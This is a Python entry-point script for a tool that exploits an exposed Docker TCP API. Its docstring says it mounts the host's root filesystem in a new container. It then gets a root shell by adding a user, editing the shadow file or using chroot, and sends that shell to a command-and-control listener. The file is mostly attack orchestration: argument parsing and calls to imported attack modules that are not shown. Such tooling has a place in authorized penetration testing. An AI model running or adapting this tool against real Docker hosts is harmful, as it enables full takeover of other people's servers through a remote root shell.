#/usr/bin/python3

'''
Automation for abusing an exposed Docker TCP Socket.

This will automatically create a container on the Docker host with the host's root filesystem mounted,
allowing arbitrary read and write of the host filesystem (which is bad).

Once created, the script will employ the method of your choosing for obtaining a root shell. Currently,
shadow and useradd are working, with the less destructive method 'useradd' being default. 

'''

import argparse
import sys
import createContainer
import shadowPwn
import userPwn
import chrootPwn
import shellHandler

def main():

    parser = argparse.ArgumentParser()
    parser.add_argument("--target", help="IP of Docker Host", type=str)
    parser.add_argument("--port", help="Docker API TCP Port", type=int)
    parser.add_argument("--image", help="Docker image to use. Default is Alpine Linux.", type=str)
    parser.add_argument("--method", help="Method to use. Valid methods are shadow, chroot, useradd. Default is useradd.", type=str)
    parser.add_argument("--c2", help="Local IP and port in [IP]:[PORT] format to receive the shell.", type=str)
    args = parser.parse_args()
    target = args.target
    port = args.port
    image = args.image
    method = args.method
    c2 = args.c2

    if target is not None and port is not None:
        
        if image is None:
            image = 'alpine'

        containerID = createContainer.create(target, port, image)
        
        if method is None or method == 'useradd':
            userPwn.attack(target, port, containerID, c2)
            shellHandler.listen(c2, method)

        elif method == 'shadow':
            shadowPwn.attack(target, port, containerID, c2)
            shellHandler.listen(c2, method)

        elif method == 'chroot':
            chrootPwn.attack(target, port, containerID, c2)
            shellHandler.listen(c2, method)
    else:
        print("[!] You must specify a target and port. Exiting.")
        sys.exit(0)
    

if __name__ == '__main__':
    main()
